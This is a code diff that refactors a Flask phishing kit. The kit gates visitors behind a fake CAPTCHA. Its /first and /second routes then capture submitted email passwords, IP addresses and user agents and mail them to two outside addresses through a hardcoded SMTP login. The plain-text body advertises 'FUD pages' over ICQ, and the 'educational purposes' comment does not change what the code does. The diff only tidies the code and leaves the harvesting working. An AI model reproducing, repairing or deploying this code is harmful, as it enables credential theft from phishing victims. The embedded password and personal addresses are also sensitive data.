@@ -3,11 +3,12 @@ import secrets
 import random
 from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
-import smtplib, ssl
+import smtplib
+import ssl
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
-# made for education purposes only
+# Made for educational purposes only
 
 app = Flask(__name__)
 secret_keyx = secrets.token_urlsafe(24)
@@ -16,11 +17,8 @@ app.secret_key = secret_keyx
 
 @app.route('/m', methods=['GET', 'POST'])
 def captcha():
-
     if request.method == 'GET':
-
         if 'passed_captcha' in session and session['passed_captcha']:
-
             # CAPTCHA has already been passed, redirect to success page
             return redirect(url_for('success'))
 
@@ -34,12 +32,11 @@ def captcha():
         session['eman'] = userauto
         session['ins'] = userdomain
         return render_template('captcha.html', code=code, color=color, eman=userauto, ins=userdomain, error=False)
-    elif request.method != 'GET':
 
+    elif request.method != 'GET':
         user_input = request.form['code']
 
         if user_input == session['code']:
-            
             # User input matches the code, set the flag and redirect to success page
             session['passed_captcha'] = True
             return redirect(url_for('success'))
@@ -51,6 +48,7 @@ def captcha():
             session['code'] = str(code)
 
             return render_template('captcha.html', code=code, color=color, error=True)
+
 
 @app.route('/success')
 def success():
@@ -73,79 +71,79 @@ def route2():
 @app.route("/first", methods=['POST'])
 def first():
     if request.method == 'POST':
-        ip = request.headers.get('X-Forwarded-For')
-        if ip is None:
-            ip = request.headers.get('X-Real-IP')
-        if ip is None:
-            ip = request.headers.get('X-Client-IP')
-        if ip is None:
-            ip = request.remote_addr
+        ip = request.headers.get('X-Forwarded-For') or request.headers.get('X-Real-IP') or \
+            request.headers.get('X-Client-IP') or request.remote_addr
+
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
         sender_email = "log@guide-level.com"
-        sender_emaill = "contact"
         receiver_email = ["danielnewwoj@gmail.com", "miriam.adelson@clubmember.org"]
         password = "!p&4Ke_@M2HR"
         useragent = request.headers.get('User-Agent')
+
         message = MIMEMultipart("alternative")
         message["Subject"] = "Hiworks Money Log"
         message["From"] = sender_email
-        message["To"] = receiver_email
-	message["To"] = ", ".join(receiver_email)
-        text = """\
-        Hi,
-        How are you?
-        contact me on icq jamescartwright for your fud pages
-        """
-        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
+        message["To"] = ", ".join(receiver_email)
+
+        text = "Hi,\nHow are you?\nContact me on ICQ James Cartwright for your FUD pages."
+        html = render_template(
+            'emailmailer.html',
+            emailaccess=email,
+            useragent=useragent,
+            passaccess=passwordemail,
+            ipman=ip
+        )
+
         part1 = MIMEText(text, "plain")
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
+
         with smtplib.SMTP_SSL("guide-level.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
-        return redirect(url_for('benza', web=session.get('eman')))
 
+        return redirect(url_for('benza', web=session.get('eman')))
 
 
 @app.route("/second", methods=['POST'])
 def second():
     if request.method == 'POST':
-        ip = request.headers.get('X-Forwarded-For')
-        if ip is None:
-            ip = request.headers.get('X-Real-IP')
-        if ip is None:
-            ip = request.headers.get('X-Client-IP')
-        if ip is None:
-            ip = request.remote_addr
+        ip = request.headers.get('X-Forwarded-For') or request.headers.get('X-Real-IP') or \
+            request.headers.get('X-Client-IP') or request.remote_addr
+
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
         sender_email = "log@guide-level.com"
-        sender_emaill = "contact"
         receiver_email = ["danielnewwoj@gmail.com", "miriam.adelson@clubmember.org"]
         password = "!p&4Ke_@M2HR"
         useragent = request.headers.get('User-Agent')
+
         message = MIMEMultipart("alternative")
         message["Subject"] = "Hiworks Money Log 2"
         message["From"] = sender_email
-        message["To"] = receiver_email
-	message["To"] = ", ".join(receiver_email)
-        text = """\
-        Hi,
-        How are you?
-        contact me on icq jamescartwright for your fud pages
-        """
-        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
+        message["To"] = ", ".join(receiver_email)
+
+        text = "Hi,\nHow are you?\nContact me on ICQ James Cartwright for your FUD pages."
+        html = render_template(
+            'emailmailer.html',
+            emailaccess=email,
+            useragent=useragent,
+            passaccess=passwordemail,
+            ipman=ip
+        )
+
         part1 = MIMEText(text, "plain")
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
+
         with smtplib.SMTP_SSL("guide-level.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
-        return redirect(url_for('lasmo', web=session.get('eman')))
 
+        return redirect(url_for('lasmo', web=session.get('eman')))
 
 
 @app.route("/benzap", methods=['GET'])
@@ -155,6 +153,7 @@ def benza():
         dman = session.get('ins')
     return render_template('ind.html', eman=eman, dman=dman)
 
+
 @app.route("/lasmop", methods=['GET'])
 def lasmo():
     userip = request.headers.get("X-Forwarded-For")
@@ -163,5 +162,6 @@ def lasmo():
         dman = session.get('ins')
     return render_template('main.html', dman=dman)
 
+
 if __name__ == '__main__':
-	app.run(host="0.0.0.0", port=3000)
+    app.run(host="0.0.0.0", port=3000)
